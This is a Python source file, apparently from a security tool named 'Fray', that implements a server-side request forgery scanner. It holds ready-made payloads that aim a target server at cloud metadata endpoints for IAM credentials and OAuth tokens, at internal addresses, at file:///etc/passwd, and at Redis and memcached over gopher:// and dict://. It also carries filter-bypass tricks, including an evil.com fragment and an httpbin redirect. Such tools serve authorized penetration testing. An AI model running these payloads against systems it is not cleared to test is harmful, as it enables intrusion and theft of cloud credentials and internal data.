"""
Fray Deep SSRF Module — Server-Side Request Forgery detection and exploitation.

Techniques:
  - URL parameter injection (http/https/gopher/dict/file schemes)
  - DNS rebinding detection
  - Cloud metadata endpoint probing (AWS/GCP/Azure/DigitalOcean)
  - Internal IP range scanning via SSRF
  - Blind SSRF via OOB callback (DNS/HTTP)
  - Redirect-based SSRF bypass
  - Protocol smuggling (gopher://, dict://)

Usage:
    scanner = SSRFScanner(url, param="url")
    result = scanner.scan()

Zero external dependencies — stdlib only.
"""

import http.client
import re
import ssl
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple


# ── Cloud Metadata Endpoints ─────────────────────────────────────────────

_METADATA_ENDPOINTS = [
    # AWS IMDSv1
    ("aws", "http://169.254.169.254/latest/meta-data/"),
    ("aws", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws", "http://169.254.169.254/latest/user-data"),
    ("aws", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
    # AWS IMDSv2 (needs token — but worth trying)
    ("aws", "http://[fd00:ec2::254]/latest/meta-data/"),
    # GCP
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/"),
    ("gcp", "http://169.254.169.254/computeMetadata/v1/"),
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    # Azure
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    # DigitalOcean
    ("digitalocean", "http://169.254.169.254/metadata/v1/"),
    ("digitalocean", "http://169.254.169.254/metadata/v1.json"),
    # Oracle Cloud
    ("oracle", "http://169.254.169.254/opc/v2/instance/"),
    # Alibaba Cloud
    ("alibaba", "http://100.100.100.200/latest/meta-data/"),
    # Kubernetes
    ("k8s", "https://kubernetes.default.svc/api/v1/namespaces"),
    ("k8s", "http://10.0.0.1:10255/pods"),
    # Docker
    ("docker", "http://127.0.0.1:2375/version"),
    ("docker", "http://127.0.0.1:2376/version"),
    # Consul
    ("consul", "http://127.0.0.1:8500/v1/agent/self"),
    # etcd
    ("etcd", "http://127.0.0.1:2379/version"),
]

# ── Internal IP Ranges ──────────────────────────────────────────────────

_INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",          # Octal
    "http://2130706433",           # Decimal
    "http://0x7f000001",           # Hex
    "http://127.1",                # Short form
    "http://127.0.0.1.nip.io",    # DNS rebinding
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

# ── SSRF Bypass Techniques ──────────────────────────────────────────────

_BYPASS_WRAPPERS = [
    # URL encoding
    ("url_encode", lambda u: urllib.parse.quote(u, safe="")),
    # Double URL encoding
    ("double_encode", lambda u: urllib.parse.quote(urllib.parse.quote(u, safe=""), safe="")),
    # @ symbol bypass: http://evil@internal
    ("at_bypass", lambda u: u.replace("http://", "http://evil@")),
    # Fragment bypass
    ("fragment", lambda u: f"http://evil.com#@{u.replace('http://', '')}"),
    # Backslash bypass
    ("backslash", lambda u: u.replace("http://", "http:\\\\")),
    # Decimal IP
    ("decimal_ip", lambda u: u.replace("127.0.0.1", "2130706433")),
    # Hex IP
    ("hex_ip", lambda u: u.replace("127.0.0.1", "0x7f000001")),
    # Octal IP
    ("octal_ip", lambda u: u.replace("127.0.0.1", "0177.0.0.1")),
    # Short IP
    ("short_ip", lambda u: u.replace("127.0.0.1", "127.1")),
    # IPv6
    ("ipv6", lambda u: u.replace("127.0.0.1", "[::1]")),
    # Redirect via external
    ("redirect_self", lambda u: f"http://httpbin.org/redirect-to?url={urllib.parse.quote(u)}"),
]

# ── Protocol Smuggling ──────────────────────────────────────────────────

_PROTOCOL_PAYLOADS = [
    ("file", "file:///etc/passwd"),
    ("file", "file:///etc/hosts"),
    ("file_win", "file:///c:/windows/win.ini"),
    ("gopher", "gopher://127.0.0.1:6379/_INFO"),
    ("gopher", "gopher://127.0.0.1:11211/_stats"),
    ("dict", "dict://127.0.0.1:6379/INFO"),
    ("ftp", "ftp://127.0.0.1/"),
]


# ── Response Indicators ─────────────────────────────────────────────────

_METADATA_INDICATORS = {
    "aws": [r"ami-id", r"instance-id", r"security-credentials", r"iam", r"AccessKeyId"],
    "gcp": [r"computeMetadata", r"service-accounts", r"access_token", r"project-id"],
    "azure": [r"vmId", r"subscriptionId", r"resourceGroupName", r"azEnvironment"],
    "digitalocean": [r"droplet_id", r"hostname", r"floating_ip"],
    "docker": [r"ApiVersion", r"MinAPIVersion", r"GitCommit"],
    "k8s": [r"apiVersion.*v1", r"kind.*Namespace", r"kubernetes"],
    "file": [r"root:.*:0:0:", r"localhost", r"\[fonts\]", r"\[extensions\]"],
    "gopher": [r"redis_version", r"STAT pid"],
}


# ── Core Scanner ─────────────────────────────────────────────────────────

class SSRFFinding:
    __slots__ = ("technique", "payload", "param", "target_type", "evidence",
                 "confidence", "cloud_provider")

    def __init__(self, technique: str, payload: str, param: str,
                 target_type: str = "", evidence: str = "",
                 confidence: str = "confirmed", cloud_provider: str = ""):
        self.technique = technique
        self.payload = payload
        self.param = param
        self.target_type = target_type
        self.evidence = evidence
        self.confidence = confidence
        self.cloud_provider = cloud_provider

    def to_dict(self) -> Dict[str, Any]:
        d = {
            "technique": self.technique,
            "payload": self.payload,
            "param": self.param,
            "target_type": self.target_type,
            "evidence": self.evidence[:200],
            "confidence": self.confidence,
        }
        if self.cloud_provider:
            d["cloud_provider"] = self.cloud_provider
        return d


class SSRFResult:
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.vulnerable = False
        self.findings: List[SSRFFinding] = []
        self.requests_made = 0
        self.duration_ms = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "vulnerable": self.vulnerable,
            "findings": [f.to_dict() for f in self.findings],
            "requests_made": self.requests_made,
            "duration_ms": self.duration_ms,
        }


class SSRFScanner:
    """Deep SSRF tester with cloud metadata, protocol smuggling, bypass techniques."""

    def __init__(self, url: str, param: str,
                 method: str = "GET",
                 headers: Optional[Dict[str, str]] = None,
                 cookie: str = "",
                 timeout: int = 10,
                 verify_ssl: bool = True,
                 level: int = 1,
                 ):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.custom_headers = headers or {}
        self.cookie = cookie
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.level = level

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_params = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"
        self._requests = 0
        self._baseline_body: str = ""
        self._baseline_len: int = 0

    def _request(self, inject_value: str) -> Tuple[int, str]:
        params = dict(self._orig_params)
        params[self.param] = inject_value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params, safe="")
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")

        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "close",
        }
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        if body_bytes:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        hdrs.update(self.custom_headers)

        try:
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self._host, self._port,
                                                    timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self._host, self._port,
                                                   timeout=self.timeout)
            conn.request(self.method, path, body=body_bytes, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(1024 * 512).decode("utf-8", errors="replace")
            status = resp.status
            conn.close()
        except Exception:
            return 0, ""

        self._requests += 1
        return status, body

    def _check_indicators(self, body: str, category: str) -> Optional[str]:
        """Check if response contains indicators for a category."""
        for cat, patterns in _METADATA_INDICATORS.items():
            if category and cat != category:
                continue
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    m = re.search(pat, body, re.IGNORECASE)
                    return m.group(0) if m else cat
        return None

    def scan(self) -> SSRFResult:
        result = SSRFResult(self.url, self.param)
        t0 = time.monotonic()

        # Baseline
        orig_val = self._orig_params.get(self.param, "http://example.com")
        _, self._baseline_body = self._request(orig_val)
        self._baseline_len = len(self._baseline_body)

        # Phase 1: Cloud metadata endpoints
        for cloud, endpoint in _METADATA_ENDPOINTS:
            status, body = self._request(endpoint)
            if status == 200 and len(body) > 10:
                indicator = self._check_indicators(body, cloud)
                if indicator:
                    result.findings.append(SSRFFinding(
                        technique="cloud_metadata",
                        payload=endpoint,
                        param=self.param,
                        target_type=cloud,
                        evidence=indicator[:100],
                        confidence="confirmed",
                        cloud_provider=cloud,
                    ))
            # Also check if body significantly differs from baseline
            elif status == 200 and body != self._baseline_body and len(body) > self._baseline_len * 0.1:
                result.findings.append(SSRFFinding(
                    technique="cloud_metadata",
                    payload=endpoint,
                    param=self.param,
                    target_type=cloud,
                    evidence=f"Different response (len={len(body)} vs baseline={self._baseline_len})",
                    confidence="possible",
                    cloud_provider=cloud,
                ))

        # Phase 2: Internal IP scanning
        for internal_url in _INTERNAL_TARGETS:
            status, body = self._request(internal_url)
            if status == 200 and body and body != self._baseline_body:
                result.findings.append(SSRFFinding(
                    technique="internal_access",
                    payload=internal_url,
                    param=self.param,
                    target_type="internal",
                    evidence=f"status={status}, len={len(body)}",
                    confidence="likely",
                ))
                break  # One internal access is enough

        # Phase 3: Protocol smuggling
        if self.level >= 2:
            for proto, payload in _PROTOCOL_PAYLOADS:
                status, body = self._request(payload)
                indicator = self._check_indicators(body, proto if proto in _METADATA_INDICATORS else "file")
                if indicator:
                    result.findings.append(SSRFFinding(
                        technique="protocol_smuggling",
                        payload=payload,
                        param=self.param,
                        target_type=proto,
                        evidence=indicator[:100],
                        confidence="confirmed",
                    ))

        # Phase 4: Bypass techniques (if basic SSRF failed)
        if not result.findings and self.level >= 2:
            test_url = "http://169.254.169.254/latest/meta-data/"
            for bypass_name, bypass_fn in _BYPASS_WRAPPERS:
                try:
                    bypassed = bypass_fn(test_url)
                except Exception:
                    continue
                status, body = self._request(bypassed)
                if status == 200 and body and body != self._baseline_body:
                    indicator = self._check_indicators(body, "")
                    if indicator:
                        result.findings.append(SSRFFinding(
                            technique=f"bypass_{bypass_name}",
                            payload=bypassed,
                            param=self.param,
                            target_type="aws",
                            evidence=indicator[:100],
                            confidence="confirmed",
                        ))
                        break

        result.vulnerable = any(f.confidence in ("confirmed", "likely") for f in result.findings)
        result.requests_made = self._requests
        result.duration_ms = int((time.monotonic() - t0) * 1000)
        return result
